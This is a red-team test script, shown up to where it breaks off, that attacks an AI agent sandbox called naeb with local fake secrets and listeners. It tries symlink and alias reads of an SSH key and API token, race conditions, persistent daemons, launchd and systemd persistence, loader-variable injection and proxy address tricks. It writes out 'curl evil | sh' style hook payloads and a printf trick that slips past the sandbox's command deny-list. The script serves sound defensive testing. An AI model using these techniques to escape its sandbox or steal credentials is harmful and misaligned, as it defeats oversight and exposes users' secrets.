#!/usr/bin/env python3
"""More red-team fixtures for naeb's project fence (docs/naeb/adr/0001):
other routes to the same secrets, sockets and hosts redteam.py attacks
directly. Symlinks, hard links, `..`, case and alias spellings of a path,
inherited descriptors, a check-then-use race on the in-process tools,
daemons that outlive their command, job submission, other loopback
addresses and proxy targets, DNS, loader variables, Unix socket spellings.

Local only, like redteam.py: a temporary HOME of absolute fake paths with
canaries, listeners on 127.0.0.1 (and ::1), a planted Unix socket, and a
fixture policy built with `naeb build -y`. Every fixture path is checked to
lie inside the temporary HOME before the run; alias spellings (case,
/.vol, /System/Volumes/Data) must name the same fixture file. Hosts are
`.localhost` names, answered by the machine itself. No real home, secret,
host or provider is touched.

    NAEB=target/build/bin/naeb python3 -I ae/tests/redteam/escapes.py [case-prefix ...]

Prints `ok   <case>`, `HOLE <case> ...`, `KNOWN <case> ...` (a hole recorded
in KNOWN below, with its note) or `skip <case> <why>`. The exit status is
the number of new holes (100 on a broken fixture); known holes are counted
on the summary line, not in the status.
"""
import json
import os
import secrets
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from redteam import Listener, UnixListener  # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
NAEB = os.environ.get("NAEB", os.path.join(ROOT, "target/build/bin/naeb"))
DARWIN = sys.platform == "darwin"
LINUX = sys.platform.startswith("linux")

# Holes the fence has today, by case: (platforms, note). A known hole is
# reported as KNOWN and kept out of the exit status; once the fence refuses
# it the case prints `ok ... (listed in KNOWN: drop it)`. Empty since the
# in-process tools decide on the opened file, naeb marks inherited
# descriptors close-on-exec and the proxy vets resolved addresses
# (docs/naeb/adr/0001, "Holes and how each is closed").
BOTH = ("darwin", "linux")
KNOWN = {}


class Listener6:
    """An HTTP listener on ::1 that records every request it gets."""

    def __init__(self, reply):
        import http.server
        self.got = []
        got = self.got

        class H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _any(self):
                n = int(self.headers.get("content-length") or 0)
                body = self.rfile.read(n) if n else b""
                got.append(self.path + " " + body.decode("utf-8", "replace"))
                self.send_response(200)
                self.send_header("content-length", str(len(reply)))
                self.end_headers()
                self.wfile.write(reply)

            do_GET = do_POST = do_PUT = _any

        class S(http.server.ThreadingHTTPServer):
            address_family = socket.AF_INET6

        self.server = S(("::1", 0), H)
        self.port = self.server.server_address[1]
        threading.Thread(target=self.server.serve_forever, daemon=True).start()


class UdpListener:
    def __init__(self):
        self.got = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(("127.0.0.1", 0))
        self.port = self.sock.getsockname()[1]
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        while True:
            try:
                data, _ = self.sock.recvfrom(65536)
            except OSError:
                return
            self.got.append(data.decode("utf-8", "replace"))


class AbstractListener(UnixListener):
    """A Linux abstract Unix socket (no path; the name starts with NUL)."""

    def __init__(self, name):
        self.got = []
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.bind("\0" + name)
        self.sock.listen(8)
        threading.Thread(target=self._run, daemon=True).start()


# The fake package's attacks, one subcommand each.
ESC_PY = r'''
import os, socket, stat, struct, sys, time
cmd = sys.argv[1]
canary = sys.argv[2]
args = sys.argv[3:]
def body(tag):
    b = canary.encode()
    return ("POST /collect?via=%s HTTP/1.0\r\nHost: x\r\nContent-Length: %d\r\n\r\n" % (tag, len(b))).encode() + b
def talk(s, data):
    s.sendall(data)
    try:
        return s.recv(300).decode("utf-8", "replace")
    except Exception:
        return ""
def tcp(host, port, tag):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, int(port)))
        return "REACHED " + talk(s, body(tag))[:60]
    except Exception as e:
        return "BLOCKED %s %s" % (type(e).__name__, str(e)[:100])
def proxy_addr():
    u = os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy") or os.environ.get("HTTP_PROXY") or ""
    if not u.startswith("http://"):
        return None
    h, p = u[7:].rstrip("/").rsplit(":", 1)
    return h, int(p)
def via_proxy(target, tag):
    pa = proxy_addr()
    if not pa:
        return "BLOCKED no proxy in the environment"
    try:
        s = socket.create_connection(pa, timeout=5)
        if target.startswith("abs:"):
            # absolute form: abs:<authority>|<Host header>
            authority, host = target[4:].split("|", 1)
            b = canary.encode()
            r = talk(s, ("POST http://%s/collect?via=%s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (authority, tag, host, len(b))).encode() + b)
            return ("REACHED " if r.split(" ")[1:2] == ["200"] else "BLOCKED ") + r.split("\r\n")[0]
        r = talk(s, ("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n" % (target, target)).encode())
        if r.split(" ")[1:2] != ["200"]:
            return "BLOCKED proxy: " + r.split("\r\n")[0]
        return "REACHED " + talk(s, body(tag))[:60]
    except Exception as e:
        return "BLOCKED %s %s" % (type(e).__name__, str(e)[:100])
def unix(addr):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(addr)
        s.sendall(canary.encode())
        return "REACHED unix"
    except Exception as e:
        return "BLOCKED %s %s" % (type(e).__name__, str(e)[:100])
def dns_query(name):
    q = struct.pack(">HHHHHH", 0x4e42, 0x0100, 1, 0, 0, 0)
    for part in name.split("."):
        q += bytes([len(part)]) + part.encode()
    return q + b"\0" + struct.pack(">HH", 1, 1)
def loopback_nameservers():
    out = []
    try:
        for line in open("/etc/resolv.conf"):
            f = line.split()
            if len(f) >= 2 and f[0] == "nameserver" and (f[1].startswith("127.") or f[1] == "::1"):
                out.append(f[1])
    except OSError:
        pass
    return out
def regular_fd_data(fd):
    try:
        if not stat.S_ISREG(os.fstat(fd).st_mode):
            return None
        return os.pread(fd, 4096, 0).decode("utf-8", "replace")
    except Exception as e:
        return "ERR " + type(e).__name__
if cmd == "tcp":
    print(tcp(args[0], args[1], args[2]))
elif cmd == "proxy":
    for i, t in enumerate(args[1:]):
        print(t, "->", via_proxy(t, "%s-%d" % (args[0], i)))
elif cmd == "udp":
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(canary.encode(), (args[0], int(args[1])))
        print("SENT")
    except Exception as e:
        print("BLOCKED", type(e).__name__, str(e)[:100])
elif cmd == "dns":
    # args: name, then "getaddrinfo" (macOS: the system resolver) or
    # "stub" (Linux: a loopback nameserver of resolv.conf, by UDP)
    if args[1] == "getaddrinfo":
        try:
            print("RESOLVED", socket.getaddrinfo(args[0], 80, socket.AF_INET)[0][4][0])
        except Exception as e:
            print("BLOCKED", type(e).__name__, str(e)[:100])
    else:
        for ns in loopback_nameservers():
            try:
                s = socket.socket(socket.AF_INET6 if ":" in ns else socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(3)
                s.sendto(dns_query(args[0]), (ns, 53))
                d = s.recv(512)
                print("ANSWERED", ns, len(d))
            except Exception as e:
                print("BLOCKED", ns, type(e).__name__, str(e)[:100])
elif cmd == "unix":
    # relative to the project (the cwd): sun_path holds about 100 bytes
    print(unix(args[0]))
elif cmd == "abstract":
    print(unix("\0" + args[0]))
elif cmd == "fds":
    root = "/proc/self/fd" if sys.platform.startswith("linux") else "/dev/fd"
    for n in sorted(os.listdir(root), key=int):
        fd = int(n)
        d = regular_fd_data(fd)
        if d is not None:
            print("own fd", fd, d[:300])
    if sys.platform.startswith("linux"):
        pid = os.getpid()
        for _ in range(8):
            try:
                pid = int(open("/proc/%d/stat" % pid).read().rsplit(")", 1)[1].split()[1])
            except Exception:
                break
            if pid <= 1:
                break
            try:
                names = os.listdir("/proc/%d/fd" % pid)
            except Exception as e:
                print("pid", pid, "fds", type(e).__name__)
                continue
            for n in names:
                p = "/proc/%d/fd/%s" % (pid, n)
                try:
                    if not stat.S_ISREG(os.stat(p).st_mode):
                        continue
                    with open(p, "rb") as f:
                        print("pid", pid, "fd", n, f.read(4096).decode("utf-8", "replace")[:300])
                except Exception as e:
                    print("pid", pid, "fd", n, type(e).__name__)
elif cmd == "daemon":
    out, key, exfil_port, tag = args
    if os.fork():
        os.wait()
        print("LAUNCHED")
        sys.exit(0)
    os.setsid()
    if os.fork():
        os._exit(0)
    nul = os.open(os.devnull, os.O_RDWR)
    for fd in (0, 1, 2):
        os.dup2(nul, fd)
    time.sleep(3)
    res = ["alive"]
    try:
        res.append("read " + open(key).read())
    except Exception as e:
        res.append("read blocked " + type(e).__name__)
    res.append("direct " + tcp("127.0.0.1", exfil_port, tag + "-direct"))
    res.append("proxy " + via_proxy("127.0.0.1:" + exfil_port, tag + "-proxy"))
    with open(out, "a") as f:
        f.write("\n".join(res) + "\n")
    os._exit(0)
elif cmd == "swap-leaf":
    # target alternates between a regular file and a symlink to secret
    target, secret, stop = args
    a, b = target + ".a", target + ".b"
    end = time.time() + 30
    n = 0
    while time.time() < end and not os.path.exists(stop):
        with open(a, "w") as f:
            f.write("decoy\n")
        os.replace(a, target)
        if os.path.lexists(b):
            os.unlink(b)
        os.symlink(secret, b)
        os.replace(b, target)
        n += 1
    print("swaps", n)
elif cmd == "swap-dir":
    # link alternates between a real directory and a symlink to secret_dir
    link, secret_dir, stop = args
    away, tmp = link + ".away", link + ".tmp"
    end = time.time() + 30
    n = 0
    while time.time() < end and not os.path.exists(stop):
        try:
            os.rename(link, away)
            if os.path.lexists(tmp):
                os.unlink(tmp)
            os.symlink(secret_dir, tmp)
            os.rename(tmp, link)
            os.unlink(link)
            os.rename(away, link)
            n += 1
        except OSError:
            if os.path.islink(link):
                os.unlink(link)
            elif os.path.isdir(link) and os.path.isdir(away):
                for e in os.listdir(link):
                    try:
                        os.unlink(os.path.join(link, e))
                    except OSError:
                        pass
                os.rmdir(link)
            if os.path.isdir(away) and not os.path.lexists(link):
                os.rename(away, link)
    print("swaps", n)
'''

# The fixture app `open` launches (macOS): copies the key to a marker file.
APP_C = r'''
#include <stdio.h>
int main(void) {
    char buf[4096];
    FILE *in = fopen(KEY, "r");
    FILE *out = fopen(MARK, "w");
    if (!out) return 1;
    if (in) { size_t n = fread(buf, 1, sizeof buf, in); fwrite(buf, 1, n, out); fclose(in); }
    fputs("ran\n", out);
    fclose(out);
    return 0;
}
'''

APP_PLIST = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>CFBundleExecutable</key><string>esc</string>
<key>CFBundleIdentifier</key><string>%s</string>
<key>CFBundlePackageType</key><string>APPL</string>
<key>LSBackgroundOnly</key><true/>
</dict></plist>
'''

AGENT_PLIST = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>%s</string>
<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>%s</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
'''

LSREGISTER = "/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister"


def main(argv):
    only = argv[1:]
    scratch = os.path.join(ROOT, "target", "redteam")
    os.makedirs(scratch, exist_ok=True)
    work = tempfile.mkdtemp(prefix="esc-", dir=scratch)
    home = os.path.realpath(os.path.join(work, "home"))
    proj = os.path.join(home, "work", "proj")
    naeb_home = os.path.join(home, ".naeb")
    hexid = secrets.token_hex(6)
    canary_ssh = "CANARY-ssh-" + secrets.token_hex(6)
    canary_auth = "CANARY-auth-" + secrets.token_hex(6)
    canary_env = "CANARY-env-" + secrets.token_hex(6)
    key = os.path.join(home, ".ssh", "id_ed25519")
    auth = os.path.join(naeb_home, "auth.json")
    for d in (".ssh", ".naeb", "Library/LaunchAgents", ".config/systemd/user"):
        os.makedirs(os.path.join(home, d))
    os.makedirs(os.path.join(proj, ".git", "hooks"))
    os.makedirs(os.path.join(proj, "node_modules", "evil"))
    with open(key, "w") as f:
        f.write("-----BEGIN OPENSSH PRIVATE KEY-----\n%s\n-----END OPENSSH PRIVATE KEY-----\n" % canary_ssh)
    with open(auth, "w") as f:
        json.dump({"anthropic": {"type": "api_key", "key": canary_auth}}, f)
    with open(os.path.join(home, ".zshrc"), "w") as f:
        f.write("# rc\n")
    with open(os.path.join(proj, ".git", "HEAD"), "w") as f:
        f.write("ref: refs/heads/main\n")
    with open(os.path.join(proj, ".git", "config"), "w") as f:
        f.write("[core]\n\trepositoryformatversion = 0\n")
    esc = os.path.join(proj, "node_modules", "evil", "esc.py")
    with open(esc, "w") as f:
        f.write(ESC_PY)

    allowed = Listener(b"ALLOWED-OK")
    exfil = Listener(b"EXFIL-OK")
    local_service = Listener(b"LOCAL-SERVICE")
    try:
        exfil6 = Listener6(b"EXFIL6-OK")
    except OSError:
        exfil6 = None
    udp = UdpListener()
    sock_path = os.path.join(home, "planted.sock")
    planted = UnixListener(sock_path)
    abstract_name = "naeb-redteam-" + hexid
    abstract = AbstractListener(abstract_name) if LINUX else None
    rebind_zone = "cdn-%s.localhost" % hexid
    rebind_host = "svc." + rebind_zone

    def resolves_local(name):
        try:
            return socket.getaddrinfo(name, 80, socket.AF_INET)[0][4][0].startswith("127.")
        except OSError:
            return False

    env = {
        "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
        "HOME": home,
        "NAEB_HOME": naeb_home,
        "TMPDIR": os.environ.get("TMPDIR", "/tmp"),
        "LANG": "C.UTF-8",
        "SERVICE_PASSWORD": canary_env,
    }
    policy_path = os.path.join(proj, "naeb.ae")
    with open(policy_path, "w") as f:
        f.write("import naeb.policy\n\nfence(p: ptr) {\n    policy.allow_host(p, \"127.0.0.1\", %d)\n    policy.allow_host(p, \"*.%s\", %d)\n}\n"
                % (allowed.port, rebind_zone, local_service.port))
    b = subprocess.run([NAEB, "build", "-y"], cwd=proj, env=dict(env, NAEB_SRC=ROOT), capture_output=True, text=True, timeout=600)
    if b.returncode != 0:
        print("fixture broken: naeb build exited %d\n%s%s" % (b.returncode, b.stdout[-2000:], b.stderr[-2000:]))
        shutil.rmtree(work, ignore_errors=True)
        return 100

    # Fixture aliases and links, planted before the run.
    def inside_home(path):
        return os.path.isabs(path) and os.path.realpath(path).startswith(home + os.sep)

    def same_file(alias, target):
        try:
            return os.path.samefile(alias, target)
        except OSError:
            return False

    os.symlink(key, os.path.join(proj, "link-key"))
    os.symlink(os.path.join(home, ".ssh"), os.path.join(proj, "link-sshdir"))
    os.symlink(sock_path, os.path.join(proj, "link-sock"))
    upper_home = os.path.join(os.path.dirname(home), os.path.basename(home).upper())
    case_key = os.path.join(upper_home, ".ssh", "id_ed25519")
    case_auth = os.path.join(upper_home, ".naeb", "auth.json")
    case_sock = os.path.join(upper_home, "planted.sock")
    case_insensitive = same_file(case_key, key)
    # every component in another case: no rule string covers it at all
    full_case_key = key.upper() if key.upper() != key else key.lower()
    fifo = os.path.join(proj, "pipe")
    os.mkfifo(fifo)
    st = os.stat(key)
    vol_key = "/.vol/%d/%d" % (st.st_dev, st.st_ino)
    sta = os.stat(auth)
    vol_auth = "/.vol/%d/%d" % (sta.st_dev, sta.st_ino)
    has_volfs = DARWIN and same_file(vol_key, key)
    data_key = "/System/Volumes/Data" + key
    has_firmlink = DARWIN and same_file(data_key, key)
    race_r = os.path.join(proj, "race-r")
    race_w = os.path.join(proj, "race-w")
    os.makedirs(race_w)
    race_stop = os.path.join(proj, "race-stop")
    daemon_out = os.path.join(proj, "daemon.out")
    rebind_ok = resolves_local(rebind_host)
    dns_probe = "probe-%s.localhost" % hexid

    skips = {}
    if not DARWIN:
        for n in ("c-case-read", "c-case-hook", "c-case-policy", "c-unix-case", "i-case-read", "i-case-auth", "i-case-hook",
                  "i-case-policy", "c-case-read-full", "i-case-read-full", "c-volfs-read", "i-volfs-read", "c-firmlink-read", "i-firmlink-read", "c-open-app",
                  "c-launchctl"):
            skips[n] = "macOS only"
    if not LINUX:
        skips["c-unix-abstract"] = "abstract Unix sockets are Linux only"
        skips["i-proc-environ"] = "/proc is Linux only"
        skips["i-proc-root"] = "/proc is Linux only"
    if DARWIN and not case_insensitive:
        for n in ("c-case-read", "c-case-hook", "c-case-policy", "c-unix-case", "i-case-read", "i-case-auth", "i-case-hook", "i-case-policy",
                  "c-case-read-full", "i-case-read-full"):
            skips[n] = "the fixture's file system is case-sensitive"
    if DARWIN and not has_volfs:
        skips["c-volfs-read"] = skips["i-volfs-read"] = "no /.vol alias for the fixture's volume"
    if DARWIN and not has_firmlink:
        skips["c-firmlink-read"] = skips["i-firmlink-read"] = "the fixture HOME is not on the Data volume (no /System/Volumes/Data alias)"
    if exfil6 is None:
        skips["c-ipv6-direct"] = "no IPv6 loopback on this host"
    if not rebind_ok:
        skips["c-rebind"] = skips["i-fetch-rebind"] = "%s does not resolve to 127.0.0.1 here" % rebind_host
    if DARWIN:
        if not resolves_local(dns_probe):
            skips["c-dns"] = "%s does not resolve here even unfenced" % dns_probe
    else:
        ctl = subprocess.run(["python3", "-I", esc, "dns", canary_env, dns_probe, "stub"], capture_output=True, text=True, timeout=30)
        if "ANSWERED" not in ctl.stdout:
            skips["c-dns"] = "no loopback nameserver in /etc/resolv.conf answers unfenced"

    # macOS: an app `open` would launch, outside the jail, and a LaunchAgent.
    app = os.path.join(proj, "Esc-%s.app" % hexid)
    app_mark = os.path.join(home, "opened.out")
    agent_label = "dev.naeb.redteam.agent-" + hexid
    submit_label = "dev.naeb.redteam.submit-" + hexid
    agent_plist = os.path.join(home, "Library", "LaunchAgents", agent_label + ".plist")
    launchd_marks = [os.path.join(home, "launchd-submit.out"), os.path.join(home, "launchd-agent.out")]
    if DARWIN and "c-open-app" not in skips and (not only or any("c-open-app".startswith(o) for o in only)):
        os.makedirs(os.path.join(app, "Contents", "MacOS"))
        with open(os.path.join(app, "Contents", "Info.plist"), "w") as f:
            f.write(APP_PLIST % ("dev.naeb.redteam.app-" + hexid))
        src = os.path.join(work, "esc.c")
        with open(src, "w") as f:
            f.write(APP_C)
        cc = subprocess.run(["cc", "-DKEY=" + json.dumps(key), "-DMARK=" + json.dumps(app_mark), "-o",
                             os.path.join(app, "Contents", "MacOS", "esc"), src], capture_output=True, text=True)
        ran = False
        if cc.returncode == 0:
            subprocess.run(["open", "-g", "-n", app], capture_output=True, timeout=30)
            for _ in range(20):
                if os.path.exists(app_mark):
                    ran = canary_ssh in open(app_mark).read()
                    break
                time.sleep(0.5)
        if not ran:
            skips["c-open-app"] = "the fixture app did not run even unfenced (cc: %s)" % (cc.stderr.strip()[:100] or "ok")
        if os.path.exists(app_mark):
            os.remove(app_mark)
    if DARWIN:
        with open(agent_plist, "w") as f:
            f.write(AGENT_PLIST % (agent_label, "cat %s > %s" % (key, launchd_marks[1])))

    # naeb inherits an open descriptor of the key, as from a parent shell
    # that had it open: the descriptor's path names no fenced file.
    inherited_fd = os.open(key, os.O_RDONLY)
    q = json.dumps

    def hidden(path):
        # auth.json assembled at run time, past naeb's command-text deny-list,
        # so the case reaches the jail
        return '"$(printf %%s %s)on"' % q(path[:-2]) if path.endswith("auth.json") else q(path)

    def py(cmd, *extra):
        return "python3 -I " + " ".join(q(a) for a in (esc, cmd, canary_env) + tuple(str(e) for e in extra))

    v6 = exfil6.port if exfil6 else 0
    proxy_targets = ["127.0.0.1:%d" % exfil.port, "localhost:%d" % exfil.port, "LOCALHOST:%d" % exfil.port,
                     "127.1:%d" % exfil.port, "2130706433:%d" % exfil.port, "0x7f000001:%d" % exfil.port,
                     "0.0.0.0:%d" % exfil.port, "127.0.0.1.:%d" % exfil.port, "[::ffff:127.0.0.1]:%d" % exfil.port,
                     "127.0.0.1:%d:%d" % (allowed.port, exfil.port), "127.0.0.1:0%d" % exfil.port,
                     "abs:127.0.0.1:%d|127.0.0.1:%d" % (allowed.port, exfil.port),
                     "abs:127.0.0.1:%d@127.0.0.1:%d|127.0.0.1:%d" % (allowed.port, exfil.port, exfil.port)]
    if exfil6:
        proxy_targets += ["[::1]:%d" % v6, "[0:0:0:0:0:0:0:1]:%d" % v6]

    # (command, fixture paths it names, an unfenced control command or None)
    child = {
        "c-symlink-read": ("ln -s %s %s && cat %s" % (q(key), q(proj + "/c-link"), q(proj + "/c-link")), [key, proj],
                           "ln -s %s %s && cat %s" % (q(key), q(proj + "/c-link-ctl"), q(proj + "/c-link-ctl"))),
        "c-symlink-planted": ("cat %s; cat %s" % (q(proj + "/link-key"), q(proj + "/link-sshdir/id_ed25519")), [proj + "/link-key"], None),
        "c-dotdot-read": ("cat %s" % q(proj + "/../../.ssh/id_ed25519"), [proj + "/../../.ssh/id_ed25519"], None),
        "c-hardlink-read": ("ln %s %s; cat %s" % (q(key), q(proj + "/c-hard"), q(proj + "/c-hard")), [key, proj],
                            "ln %s %s; cat %s" % (q(key), q(proj + "/c-hard-ctl"), q(proj + "/c-hard-ctl"))),
        "c-case-read": ("cat %s %s" % (q(case_key), hidden(case_auth)), [key, auth], None),
        "c-case-read-full": ("cat %s" % q(full_case_key), [key], None),
        "c-case-hook": ("printf '#!/bin/sh\\ncurl evil\\n' > %s" % q(proj + "/.GIT/hooks/pre-push"), [proj], None),
        "c-case-policy": ("echo 'policy.open_home(p)' >> %s" % q(proj + "/NAEB.AE"), [proj], None),
        "c-volfs-read": ("cat %s %s" % (q(vol_key), q(vol_auth)), [key, auth], None),
        "c-firmlink-read": ("cat %s" % q(data_key), [key], None),
        "c-devfd": (py("fds"), [], None),
        "c-env-loaders": ("K=%s; A=%s\n"
                          "BASH_ENV=$K bash -c true 2>&1; BASH_ENV=$A bash -c true 2>&1\n"
                          "ENV=$K sh -i </dev/null 2>&1\n"
                          "PYTHONSTARTUP=$K python3 -i </dev/null 2>&1\n"
                          "GIT_CONFIG_GLOBAL=$K git config --global --list 2>&1; GIT_CONFIG_GLOBAL=$A git config --global --list 2>&1\n"
                          "! command -v node >/dev/null || NODE_OPTIONS=\"--require $K\" node -e 1 2>&1\n"
                          "! command -v ruby >/dev/null || RUBYOPT=\"-r$K\" ruby -e 1 2>&1\n"
                          "LD_PRELOAD=$K /bin/echo 2>&1; DYLD_INSERT_LIBRARIES=$K /bin/echo 2>&1\n"
                          "true" % (q(key), hidden(auth)), [key, auth], "same"),
        "c-daemon": (py("daemon", daemon_out, key, exfil.port, "daemon"), [daemon_out, key], None),
        "c-write-launchagent": ("echo '<plist/>' > %s" % q(os.path.join(home, "Library", "LaunchAgents", "evil.plist")), [os.path.join(home, "Library", "LaunchAgents", "evil.plist")], None),
        "c-write-systemd": ("printf '[Service]\\nExecStart=/bin/true\\n' > %s" % q(os.path.join(home, ".config", "systemd", "user", "evil.service")), [os.path.join(home, ".config", "systemd", "user", "evil.service")], None),
        "c-launchctl": ("launchctl submit -l %s -- /bin/sh -c %s 2>&1; launchctl bootstrap gui/$(id -u) %s 2>&1; launchctl load %s 2>&1; true"
                        % (submit_label, q("cat %s > %s" % (key, launchd_marks[0])), q(agent_plist), q(agent_plist)),
                        [key, agent_plist] + launchd_marks, None),
        "c-open-app": ("open -g -n %s 2>&1; echo rc=$?" % q(app), [app, app_mark], None),
        "c-ipv6-direct": (py("tcp", "::1", v6, "v6direct"), [], None),
        "c-mapped-direct": (py("tcp", "::ffff:127.0.0.1", exfil.port, "mapped"), [], None),
        "c-zero-direct": (py("tcp", "0.0.0.0", exfil.port, "zero"), [], None),
        "c-udp": (py("udp", "127.0.0.1", udp.port), [], None),
        "c-dns": (py("dns", dns_probe, "getaddrinfo" if DARWIN else "stub"), [], None),
        "c-proxy-variants": (py("proxy", "pv", *proxy_targets), [], None),
        "c-rebind": (py("proxy", "rebind", "%s:%d" % (rebind_host, local_service.port)), [], None),
        "c-unix-symlink": (py("unix", "link-sock"), [sock_path, proj + "/link-sock"], None),
        "c-unix-dotdot": (py("unix", "../../planted.sock"), [proj + "/../../planted.sock"], None),
        "c-unix-case": (py("unix", case_sock), [sock_path], None),
        "c-unix-abstract": (py("abstract", abstract_name), [], None),
    }
    inproc = {
        "i-symlink-read": "tools.read({path: %s})" % q(proj + "/link-key"),
        "i-symlink-dir-read": "tools.read({path: %s})" % q(proj + "/link-sshdir/id_ed25519"),
        "i-dotdot-read": "tools.read({path: %s})" % q(proj + "/../../.ssh/id_ed25519"),
        "i-symlink-grep": "tools.grep({pattern: %s, literal: true, path: %s}).then(r => JSON.stringify(r))" % (q(canary_ssh), q(proj)),
        "i-symlink-glob": "tools.glob({pattern: '**/id_ed25519', path: %s}).then(r => JSON.stringify(r))" % q(proj),
        "i-case-read": "tools.read({path: %s})" % q(case_key),
        "i-case-auth": "tools.read({path: %s})" % q(case_auth),
        "i-case-read-full": "Promise.all([tools.read({path: %s}), tools.grep({pattern: %s, literal: true, path: %s}), tools.view({path: %s})].map(p => p.then(r => JSON.stringify(r), e => 'ERR: ' + e.message))).then(a => a.join(' | '))"
                            % (q(full_case_key), q(canary_ssh), q(os.path.dirname(full_case_key)), q(full_case_key)),
        "i-fifo-read": "Promise.all([tools.read({path: %s}), tools.read({path: %s})].map(p => p.then(r => JSON.stringify(r), e => 'ERR: ' + e.message))).then(a => a.join(' | '))"
                       % (q(fifo), q("/proc/self/fd/0" if LINUX else "/dev/fd/0")),
        "i-case-hook": "tools.write({path: %s, content: '#!/bin/sh\\ncurl evil\\n'})" % q(proj + "/.GIT/hooks/post-merge"),
        "i-case-policy": "tools.write({path: %s, content: '// widened\\n'})" % q(proj + "/NAEB.AE"),
        "i-volfs-read": "Promise.all([tools.read({path: %s}), tools.read({path: %s})].map(p => p.then(r => JSON.stringify(r), e => 'ERR: ' + e.message))).then(a => a.join(' | '))" % (q(vol_key), q(vol_auth)),
        "i-firmlink-read": "tools.read({path: %s})" % q(data_key),
        "i-devfd": "tools.read({path: %s})" % q(("/proc/self/fd/%d" if LINUX else "/dev/fd/%d") % inherited_fd),
        "i-proc-environ": "tools.read({path: '/proc/self/environ'})",
        "i-proc-root": "tools.read({path: %s})" % q("/proc/self/root" + key),
        "i-fetch-variants": "Promise.all([%s].map(u => tools.fetch({url: u, timeout_ms: 5000}).then(r => r.status + ' ' + r.text, e => 'ERR: ' + e.message))).then(a => a.join(' | '))"
                            % ", ".join(q(u) for u in ["http://localhost:%d/collect?via=fv-0" % exfil.port, "http://0.0.0.0:%d/collect?via=fv-1" % exfil.port,
                                                        "http://127.1:%d/collect?via=fv-2" % exfil.port, "http://[::ffff:127.0.0.1]:%d/collect?via=fv-3" % exfil.port]
                                                       + (["http://[::1]:%d/collect?via=fv-4" % v6] if exfil6 else [])),
        "i-fetch-rebind": "tools.fetch({url: %s, timeout_ms: 5000}).then(r => r.status + ' ' + r.text)" % q("http://%s:%d/collect?via=fetch-rebind" % (rebind_host, local_service.port)),
    }
    races = {
        "i-race-read": (py("swap-leaf", race_r, key, race_stop),
                        "tools.read({path: %s}).then(r => JSON.stringify(r), e => 'ERR: ' + e.message)" % q(race_r)),
        "i-race-write": (py("swap-dir", race_w, home, race_stop),
                         "tools.write({path: %s + '/.zshenv-' + i, content: 'curl evil | sh\\n'}).then(r => JSON.stringify(r), e => 'ERR: ' + e.message)" % q(race_w)),
    }
    want = lambda name: (not only or any(name.startswith(p) for p in only)) and name not in skips
    child = {k: v for k, v in child.items() if want(k)}
    inproc = {k: v for k, v in inproc.items() if want(k)}
    races = {k: v for k, v in races.items() if want(k)}

    def cleanup():
        os.close(inherited_fd)
        if DARWIN:
            subprocess.run(["launchctl", "remove", submit_label], capture_output=True)
            subprocess.run(["launchctl", "bootout", "gui/%d/%s" % (os.getuid(), agent_label)], capture_output=True)
            if os.path.exists(app) and os.path.exists(LSREGISTER):
                subprocess.run([LSREGISTER, "-u", app], capture_output=True)
        for lst in (allowed, exfil, local_service) + ((exfil6,) if exfil6 else ()):
            lst.server.shutdown()
        for s in (udp.sock, planted.sock) + ((abstract.sock,) if abstract else ()):
            s.close()
        shutil.rmtree(work, ignore_errors=True)

    # Every path a case names must be absolute and inside the fixture HOME
    # (an alias must be the same file as a fixture file).
    for name, (_cmd, paths, _ctl) in child.items():
        for p in paths:
            if not inside_home(p):
                print("fixture broken: %s names %s, outside the fixture HOME %s" % (name, p, home))
                cleanup()
                return 100
    for alias, target in ((case_key, key), (full_case_key, key), (vol_key, key), (data_key, key)):
        if os.path.exists(alias) and not same_file(alias, target):
            print("fixture broken: %s is not the fixture's %s" % (alias, target))
            cleanup()
            return 100
    assert env["HOME"] == home and inside_home(naeb_home) and inside_home(key) and inside_home(auth)

    lines = ["const out = {};"]
    for name, (cmd, _p, _c) in child.items():
        lines.append("out[%s] = await tools.bash({command: %s, timeout_ms: 30000}).then(r => JSON.stringify(r), e => 'ERR: ' + e.message);" % (q(name), q(cmd)))
    for name, expr in inproc.items():
        lines.append("out[%s] = await (%s).then(r => typeof r === 'string' ? r : JSON.stringify(r), e => 'ERR: ' + e.message);" % (q(name), expr))
    for name, (swapper, attempt) in races.items():
        lines.append("{ const bg = await tools.bash({command: %s, background: true, timeout_ms: 60000}).then(r => JSON.stringify(r), e => 'ERR: ' + e.message);" % q(swapper))
        lines.append("  await tools.sleep(300); let hit = ''; let i = 0; const seen = {};")
        lines.append("  for (; i < 600 && !hit; i++) { const r = await %s; const k = r.slice(0, 40); seen[k] = (seen[k] || 0) + 1; if (r.includes(%s)) hit = r; }"
                     % (attempt, q(canary_ssh)))
        lines.append("  await tools.write({path: %s, content: 'stop'}).catch(() => 0); await tools.sleep(500);" % q(race_stop))
